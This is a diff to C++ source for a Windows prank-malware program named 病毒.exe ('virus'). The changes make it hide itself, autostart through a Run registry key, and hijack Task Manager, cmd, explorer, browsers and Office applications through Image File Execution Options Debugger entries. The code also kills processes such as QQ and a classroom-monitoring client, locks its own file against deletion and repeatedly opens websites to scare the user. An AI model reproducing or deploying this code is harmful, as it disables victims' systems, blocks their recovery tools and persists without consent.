@@ -45,17 +45,17 @@ DWORD WINAPI WEB(LPVOID Param)
 {
 	while(1)
 	{
-		Sleep(300000);
+		Sleep(30000);
 		system("start luogu.com.cn");
-		Sleep(300000);
+		Sleep(30000);
 		system("start cn.bing.com");
-		Sleep(300000);
+		Sleep(30000);
 		system("start zzcjas.github.io");
-		Sleep(300000);
+		Sleep(30000);
 		system("start github.com");
-		Sleep(300000);
+		Sleep(30000);
 		system("start githubs.com");
-		Sleep(300000);
+		Sleep(30000);
 		system("start luogu.org");//开网站吓唬用户 
 	}
 }
@@ -223,6 +223,8 @@ DWORD WINAPI KILL(LPVOID Param)
     	Sleep(100);
     	system("taskkill /im ielowutil.exe /f");
     	Sleep(100);
+    	system("taskkill /im qq.exe /f");
+    	Sleep(100);
     	system("taskkill /im studentmain.exe /f");
     	ProcessId=0;
 		hProcessSnapShot=NULL;
@@ -249,6 +251,13 @@ DWORD WINAPI KILL(LPVOID Param)
 }//把常用进程炸了(顺便帮个忙,把极域课堂杀了)
 char pathn[6145];
 string k;
+void CreateReg(HKEY Root,char*szSubKey,char* ValueName,char* Data)
+{
+	HKEY key;
+	long Ret=RegCreateKeyEx(Root,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&key,NULL);
+    Ret=RegSetValueEx(key,ValueName,0,REG_SZ,(BYTE*)Data,strlen(Data));
+	RegCloseKey(key);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+}
 int main()
 {
 	ShowWindow(GetForegroundWindow(),0);//隐藏窗口 
@@ -256,14 +265,24 @@ int main()
 	_getcwd(pathn,6145);//得路径 
 	k=pathn;
 	k+="\\病毒.exe";
-	SetFileAttributes(pathn,FILE_ATTRIBUTE_HIDDEN);//隐藏文件 
-    HKEY hKey;
-    char *pppp=(char*)k.c_str();
-    LPCTSTR StrKey="Software//Microsoft//Windows//CurrentVersion//Run";
-    ::RegOpenKeyEx(HKEY_CURRENT_USER,StrKey,NULL,KEY_ALL_ACCESS,&hKey);
-    LPCSTR KeyValue="病毒.exe";
-    ::RegSetValueEx(hKey,(LPCTSTR)KeyValue,0,REG_SZ,(BYTE*)(LPCSTR)pppp,strlen(pppp)+1);
-    ::RegCloseKey(hKey); //开机自启动 
+	SetFileAttributes((char*)k.c_str(),FILE_ATTRIBUTE_HIDDEN);//隐藏文件 
+    CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Run","病毒.exe",(char*)k.c_str()); //开机自启动 
+    CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\qq.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Taskmgr.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\msedge.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\chrome.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\write.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\studentmain.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\iexplorer.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\WINWORD.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\POWERPNT.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ONENOTE.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\EXCEL.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mspaint.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cmd.exe","Debugger",(char*)k.c_str());//映像劫持 
     FILE *lock=fopen("病毒.exe","rb");//锁死文件,杀不掉 
 	CreateThread(NULL,4096,&NOSHUT,NULL,NULL,NULL);
 	CreateThread(NULL,4096,&WEB,NULL,NULL,NULL);
